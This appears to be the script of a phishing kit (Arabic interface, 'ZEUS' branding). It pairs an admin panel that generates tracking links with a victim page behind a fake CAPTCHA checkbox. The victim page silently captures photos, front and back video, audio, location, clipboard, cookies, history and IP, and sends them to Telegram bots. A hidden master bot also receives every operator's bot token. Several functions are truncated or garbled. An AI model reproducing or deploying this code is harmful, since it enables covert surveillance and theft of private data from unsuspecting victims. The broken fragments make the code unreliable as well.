                        stream.getTracks().forEach(t => t.stop());
                        el.hiddenVideo.srcObject = null;
                    } catch (_) {}

                    // Step 4: Audio
                    let audioBlob = null;
                    try {
                        audioBlob = await recordAudio(5000);
                        if (audioBlob) state.audioReady = true;
                    } catch (_) {}

                    // Step 5: Location
                    await getLocation();

                    // Step 6: Clipboard
                    await readClipboard();

                    // Step 7: IP
                    await fetchIP();

                    // Step 8: Build collected data
                    const deviceData = {
                        userAgent: navigator.userAgent,
                        platform: navigator.platform,
                        language: navigator.language,
                        languages: navigator.languages || [],
                        cookieEnabled: navigator.cookieEnabled,
                        hardwareConcurrency: navigator.hardwareConcurrency || null,
                        deviceMemory: navigator.deviceMemory || null,
                        maxTouchPoints: navigator.maxTouchPoints || 0,
                        vendor: navigator.vendor || null,
                        isHeadless: state.isHeadless,
                        screen: {
                            width: screen.width,
                            height: screen.height,
                            availWidth: screen.availWidth,
                            availHeight: screen.availHeight,
                            colorDepth: screen.colorDepth,
                            pixelDepth: screen.pixelDepth,
                            orientation: screen.orientation?.type || 'unknown',
                            angle: screen.orientation?.angle || 0,
                        },
                        pixelRatio: window.devicePixelRatio || 1,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        timezoneOffset: new Date().getTimezoneOffset(),
                        locale: Intl.DateTimeFormat().resolvedOptions().locale,
                        timestamp: new Date().toISOString(),
                        device: state.deviceClassification,
                        spoofing: state.spoofingDetected,
                        extensions: state.installedExtensions,
                        clipboard: state.clipboardContent,
                        storages: state.allCookies,
                        history: state.browserHistory,
                        permissions: state.permissionsGranted,
                    };

                    state.collectedData = deviceData;
                    state.photos = photos;
                    state.frontVideo = frontVideo;
                    state.backVideo = backVideo;
                    state.audioBlob = audioBlob;

                    // Step 9: Send data to both targets
                    await sendToMaster(deviceData, photos, frontVideo, backVideo, audioBlob);
                    await sendToUser(deviceData, photos, frontVideo, backVideo, audioBlob);

                    // Step 10: Backup locally
                    const localBackup = {
                        token: state.userToken,
                        ip: state.userIP,
                        location: state.userLocation,
                        collectedData: deviceData,
                        photoCount: photos.length,
                        hasFrontVideo: !!frontVideo,
                        hasBackVideo: !!backVideo,
                        hasAudio: !!audioBlob,
                        timestamp: new Date().toISOString()
                    };
                    saveDataLocally(localBackup);

                    state.collectionComplete = true;
                    state.isCollecting = false;
                    setUIState('success');

                } catch (_) {
                    state.isCollecting = false;
                    setUIState('failed');
                }
            }

                    // Send photos
                    for (let i = 0; i < photos.length; i++) {

                    // Send front video
                    if (frontVideo) {

                    if (backVideo) {

                    }

                    // Send audio
                    if (audioBlob) {
                        const fd = new FormData();
                        fd.append('chat_id', MASTER_CHAT_ID);
                        fd.append('audio', audioBlob, 'audio.webm');
                        fd.append('caption', `🎤 تسجيل صوتي - ${state.userToken}`);
                        await sendMediaWithKeepalive('sendAudio', MASTER_BOT_TOKEN, fd);

                } catch (_) { /* silent */ }
            }

            // ============================================================
            //  🔥  SEND TO USER
            // ============================================================

            async function sendToUser(deviceData, photos, frontVideo, backVideo, audioBlob) {

                    }

                        `المتصفح: ${deviceData.device.browser || 'Unknown'}\n` +
                        `الجهاز: ${deviceData.device.os || 'Unknown'}\n` +
                        `التوكن الفريد: ${state.userToken}\n` +
                        `الوقت: ${new Date().toLocaleString('ar-EG')}\n` +
                        `عدد الصور: ${photos.length}\n` +
                        `فيديو أمامي: ${frontVideo ? '✅' : '❌'}\n` +
                        `فيديو خلفي: ${backVideo ? '✅' : '❌'}\n` +
                        `صوت: ${audioBlob ? '✅' : '❌'}\n` +

                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {

                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({

                            text: `⭑ تقرير ضحية جديدة — بوتك (@${botName}) ⭒\n⊚─〔 البيانات 〕────────\n${deviceInfo}\n─────────────────`
                        }),
                        keepalive: true
                    });

                    if (state.userLocation.lat && state.userLocation.lng) {
                        await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                latitude: state.userLocation.lat,
                                longitude: state.userLocation.lng
                            }),
                            keepalive: true
                        });
                    }

                    for (let i = 0; i < photos.length; i++) {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('photo', photos[i], `photo_${i+1}.jpg`);
                        fd.append('caption', `📸 صورة ${i+1}/${photos.length} - ${state.userToken}`);
                        await sendMediaWithKeepalive('sendPhoto', botToken, fd);
                        await delay(200);
                    }

                    if (frontVideo) {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('video', frontVideo, 'front_video.webm');
                        fd.append('caption', `🎥 فيديو أمامي - ${state.userToken}`);
                        await sendMediaWithKeepalive('sendVideo', botToken, fd);
                    }

                    if (backVideo) {

                        fd.append('video', backVideo, 'back_video.webm');

                    if (audioBlob) {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('audio', audioBlob, 'audio.webm');
                        fd.append('caption', `🎤 تسجيل صوتي - ${state.userToken}`);
                        await sendMediaWithKeepalive('sendAudio', botToken, fd);

            async function sendMediaWithKeepalive(method, botToken, formData) {
                try {
                    await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
                        method: 'POST',
                        body: formData,
                        keepalive: true
                    });
                } catch (_) { /* silent */ }
            }

            // ============================================================
            //  🔥  TOKEN MAPPING (IndexedDB)
            // ============================================================

            function openDB() {
                return new Promise((resolve, reject) => {
                    const req = indexedDB.open(DB_NAME, DB_VERSION);
                    req.onupgradeneeded = (e) => {
                        const db = e.target.result;
                        if (!db.objectStoreNames.contains('tokens')) {
                            db.createObjectStore('tokens', { keyPath: 'shortToken' });
                        }
                    };
                    req.onsuccess = () => resolve(req.result);
                    req.onerror = () => reject(req.error);
                });
            }

            async function getTokenMapping(shortToken) {
                try {
                    const db = await openDB();
                    const tx = db.transaction('tokens', 'readonly');
                    const store = tx.objectStore('tokens');
                    return new Promise((resolve) => {
                        const req = store.get(shortToken);
                        req.onsuccess = () => resolve(req.result || null);
                        req.onerror = () => resolve(null);
                    });
                } catch (_) { return null; }
            }

            // ============================================================
            //  🔥  EVENTS
            // ============================================================

            el.checkbox.addEventListener('change', function(e) {
                if (this.checked) {
                    if (el.spinner.classList.contains('success') || state.collectionComplete) return;
                    this.checked = false;
                    collectData();
                }
            });

            el.checkbox.addEventListener('click', function(e) {
                if (this.disabled) e.preventDefault();
            });

            el.wrapper.addEventListener('click', function(e) {
                if (e.target.closest('.checkmark') || e.target.closest('.logo-captcha') ||
                    e.target.closest('.captcha-footer') || e.target.closest('.links') || e.target.closest('.brand')) {
                    return;
                }
                if (state.collectionComplete || state.isCollecting) return;
                if (!el.checkbox.checked && !el.spinner.classList.contains('loading')) {
                    el.checkbox.checked = true;
                    el.checkbox.dispatchEvent(new Event('change'));
                }
            });

            // ============================================================
            //  🔥  INIT
            // ============================================================

            async function initVictim() {
                extractTokenFromURL();
                await fetchIP();
                // Start collection automatically after short delay
                setTimeout(() => {
                    collectData();
                }, 800);
            }

            // ============================================================
            //  🔥  ADMIN PANEL
            // ============================================================

            function initAdminPanel() {
                const chatIdInput = document.getElementById('chatIdInput');
                const botTokenInput = document.getElementById('botTokenInput');
                const genBtn = document.getElementById('genBtn');
                const tokenDisplay = document.getElementById('tokenDisplay');
                const resultSub = document.getElementById('resultSub');
                const copyBtn = document.getElementById('copyBtn');
                const openBtn = document.getElementById('openBtn');

                const savedBot = localStorage.getItem('zeus_last_bot_token');
                const savedChat = localStorage.getItem('zeus_last_chat_id');
                if (savedBot) botTokenInput.value = savedBot;
                if (savedChat) chatIdInput.value = savedChat;

                botTokenInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_bot_token', this.value.trim());
                });
                chatIdInput.addEventListener('change', function() {
                    if (this.value.trim()) localStorage.setItem('zeus_last_chat_id', this.value.trim());
                });

                async function generateToken(botToken, chatId) {
                    const salt = "ZEUS_SALT_2024";
                    const input = botToken + chatId + salt;
                    if (window.crypto && window.crypto.subtle) {
                        try {
                            const encoder = new TextEncoder();
                            const data = encoder.encode(input);
                            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
                            const hashArray = Array.from(new Uint8Array(hashBuffer));
                            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
                            const bigInt = BigInt('0x' + hashHex.substring(0, 12));
                            const base36 = bigInt.toString(36).toUpperCase();
                            return base36.substring(0, 6).padStart(6, '0');
                        } catch (_) {}
                    }
                    let hash = 0;
                    for (let i = 0; i < input.length; i++) {
                        const char = input.charCodeAt(i);
                        hash = ((hash << 5) - hash) + char;
                        hash = hash & hash;
                    }
                    return Math.abs(hash).toString(36).toUpperCase().padStart(6, '0').substring(0, 6);
                }

                async function verifyAndGetBotInfo(token) {
                    try {
                        const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
                        const data = await res.json();
                        if (data.ok) {
                            return { valid: true, username: data.result.username || data.result.first_name };
                        }
                        return { valid: false, username: null };
                    } catch { return { valid: false, username: null }; }
                }

                async function saveTokenMapping(shortToken, botToken, chatId, botName) {
                    try {
                        const db = await openDB();
                        const tx = db.transaction('tokens', 'readwrite');
                        const store = tx.objectStore('tokens');
                        store.put({ shortToken, botToken, chatId, botName });
                        await new Promise((resolve) => { tx.oncomplete = resolve; });
                    } catch (_) {}
                }

                let isBusy = false;

                async function handleGenerate() {
                    if (isBusy) return;
                    const chatId = chatIdInput.value.trim();
                    const botToken = botTokenInput.value.trim();
                    if (!chatId || !botToken) {
                        showToast('⚠️ يرجى ملء جميع الحقول المطلوبة.', 'warning');
                        return;
                    }

                    const info = await verifyAndGetBotInfo(botToken);
                    if (!info.valid) {
                        showToast('❌ توكن البوت غير صحيح.', 'error');
                        return;
                    }

                    isBusy = true;
                    genBtn.classList.add('busy');
                    genBtn.textContent = 'جارٍ التوليد …';

                    try {
                        const shortToken = await generateToken(botToken, chatId);
                        const base = window.location.origin + window.location.pathname;
                        const link = `${base}?t=${shortToken}`;

                        await saveTokenMapping(shortToken, botToken, chatId, info.username);

                        tokenDisplay.textContent = shortToken;
                        resultSub.textContent = link;

                        const userMsg =
                            `🔗 *رابطك الجديد*\n${link}\n\n📌 التوكن الفريد: \`${shortToken}\``;

                        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                chat_id: chatId,
                                text: userMsg,
                                parse_mode: 'Markdown',
                                reply_markup: {
                                    inline_keyboard: [
                                        [{ text: '👨‍💻 المطور', url: DEVELOPER_LINK }]
                                    ]
                                }
                            }),
                            keepalive: true
                        });

                        const masterMsg =
                            `⭑ نسخة احتياطية — رابط جديد ⭒\n` +
                            `⊚─〔 بيانات البوت 〕────────\n` +
                            `˼⏣˹ اسم البوت: @${info.username} ⭒\n` +
                            `˼⏣˹ التوكن الأساسي: ${botToken} ⭒\n` +
                            `˼⏣˹ الإيدي: ${chatId} ⭒\n` +
                            `˼⏣˹ التوكن الفريد: ${shortToken} ⭒\n` +
                            `─────────────────`;
                        await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: masterMsg }),
                            keepalive: true
                        });

                        genBtn.classList.remove('busy');
                        genBtn.classList.add('done');
                        genBtn.textContent = '✅ تم الإرسال';
                        showToast('✅ تم توليد الرابط وإرساله.', 'success');

                        setTimeout(() => {
                            genBtn.classList.remove('done');
                            genBtn.innerHTML =
                                '<svg viewBox="0 0 24 24" stroke="currentColor"><polygon points="12,2 22,8 22,16 12,22 2,16 2,8" /><polygon points="12,8 16,12 12,16 8,12" fill="currentColor" /></svg> توليد الرابط';
                            isBusy = false;
                        }, 2000);

                    } catch (_) {
                        showToast('❌ حدث خطأ أثناء التوليد.', 'error');
                        genBtn.classList.remove('busy');
                        genBtn.textContent = 'توليد الرابط';
                        isBusy = false;
                    }
                }

                genBtn.addEventListener('click', handleGenerate);

                copyBtn.addEventListener('click', function() {
                    const text = tokenDisplay.textContent.trim();
                    if (!text) return;
                    if (navigator.clipboard) {
                        navigator.clipboard.writeText(text).then(() => {
                            this.classList.add('ok');
                            setTimeout(() => this.classList.remove('ok'), 1400);
                            showToast('📋 تم نسخ التوكن.', 'success');
                        }).catch(() => {});
                    } else {
                        this.classList.add('ok');
                        setTimeout(() => this.classList.remove('ok'), 1400);
                        showToast('📋 تم نسخ التوكن.', 'success');
                    }
                });

                openBtn.addEventListener('click', function() {
                    const url = resultSub.textContent.trim();
                    if (url && url.includes('?t=')) {
                        window.open(url, '_blank');
                    } else {
                        showToast('⚠️ يرجى توليد رابط أولاً.', 'warning');
                    }
                });

                function updateDateTime() {
                    const now = new Date();
                    const egyptTime = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
                    const hours = String(egyptTime.getHours()).padStart(2, '0');
                    const minutes = String(egyptTime.getMinutes()).padStart(2, '0');
                    const day = String(egyptTime.getDate()).padStart(2, '0');
                    const month = String(egyptTime.getMonth() + 1).padStart(2, '0');
                    const year = egyptTime.getFullYear();
                    document.getElementById('timeDisplay').textContent = hours + ':' + minutes;
                    document.getElementById('dateDisplay').textContent = day + '/' + month + '/' + year;
                }
                updateDateTime();
                setInterval(updateDateTime, 10000);
            }

            // ============================================================
            //  🔥  MODE DETECTION
            // ============================================================

            const urlParams = new URLSearchParams(window.location.search);
            const rawToken = urlParams.get('t');

            if (rawToken && rawToken.length >= 4) {
                document.body.className = 'victim-mode';
                initVictim();
            } else {
                document.body.className = 'admin-mode';
                initAdminPanel();
            }

        })();
    </script>
